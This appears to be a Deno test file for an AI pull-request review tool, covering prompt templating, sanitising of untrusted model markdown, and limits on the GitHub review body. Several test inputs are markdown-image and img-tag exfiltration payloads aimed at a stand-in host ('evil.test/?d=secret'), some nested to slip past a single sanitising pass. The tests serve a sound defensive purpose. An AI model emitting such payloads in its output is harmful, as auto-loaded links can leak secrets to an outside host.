import { deepEqual as assertEquals, throws as assertThrows } from "node:assert/strict";
import { renderPrompt } from "./prompt.ts";
import { reviewBody } from "./messages.ts";
import { codeSpan, sanitizeMarkdown } from "./sanitize.ts";

const variables = {
  repository: "marimo-team/marimo",
  number: 7,
  headSha: "a".repeat(40),
  headDir: "pr-head",
  contextDir: "_agent_review/context",
};

Deno.test("renders prompt variables and appends the review guide", () => {
  const prompt = renderPrompt(
    ["Review #{{number}}.", "Read {{headDir}}/."],
    variables,
    "# Review instructions\n\nCheck the kernel.",
  );
  assertEquals(
    prompt,
    "Review #7.\n\nRead pr-head/.\n\n## Review instructions\n\nCheck the kernel.\n",
  );
  assertEquals(renderPrompt(["x"], variables, "  \n"), "x\n");
  assertThrows(() => renderPrompt(["{{missing}}"], variables, undefined));
});

Deno.test("sanitizes markdown that reassembles after one pass", () => {
  assertEquals(sanitizeMarkdown("!![x](https://e/?d=1)"), "[x](https://e/?d=1)");
  assertEquals(sanitizeMarkdown("<im<img>g src=https://e/?d=2>"), "");
  assertEquals(sanitizeMarkdown("&#64;octocat &#x40;octocat"), "@\u200boctocat @\u200boctocat");
});

Deno.test("sanitizes untrusted model markdown", () => {
  assertEquals(
    sanitizeMarkdown("see ![x](https://evil.test/?d=secret)"),
    "see [x](https://evil.test/?d=secret)",
  );
  assertEquals(sanitizeMarkdown('a<img src="https://evil.test">b'), "ab");
  assertEquals(sanitizeMarkdown("cc @octocat"), "cc @\u200boctocat");
  assertEquals(sanitizeMarkdown("`List<String>` and a && b"), "`List<String>` and a && b");
});

Deno.test("keeps file names inside their code span", () => {
  assertEquals(codeSpan("a`![x](https://e)`.py"), "`a'[x](https://e)'.py`");
});

Deno.test("review body distinguishes proposed from enforced decisions", () => {
  const result = {
    outcome: "completed" as const,
    summary: "s",
    coverage: "c",
    limitations: [],
    findings: [],
  };
  const run = {
    harness: "claude" as const,
    requester: "maintainer",
    runUrl: "https://x",
    headSha: "a".repeat(40),
  };
  const options = { run, result, unanchored: [], notes: [] };
  const verdict = { kind: "comment" as const, reasons: ["Changes `![x](https://evil.test)`."] };

  const comment = reviewBody({ ...options, verdict, event: "COMMENT" });
  assertEquals(comment.includes("**Decision: Comment**"), true);
  assertEquals(comment.includes("https://evil.test") && !comment.includes("!["), true);

  const proposed = reviewBody({
    ...options,
    verdict: { kind: "approve" },
    event: "COMMENT",
  });
  assertEquals(proposed.includes("**Proposed decision: Approve** (this repository doesn't"), true);
});

Deno.test("caps the review body below GitHub's limit and keeps the footer", () => {
  const long = "x".repeat(7_000);
  const finding = {
    path: "a.ts",
    line: 1,
    side: "RIGHT" as const,
    severity: "low" as const,
    title: "t",
    body: long,
  };
  const body = reviewBody({
    run: { harness: "claude", requester: "m", runUrl: "https://x", headSha: "a".repeat(40) },
    result: { outcome: "completed", summary: long, coverage: long, limitations: [], findings: [] },
    verdict: { kind: "comment", reasons: [] },
    event: "COMMENT",
    unanchored: Array(30).fill(finding),
    notes: [],
  });
  assertEquals(body.length < 65_536, true);
  assertEquals(body.endsWith("[Run](https://x)"), true);
});
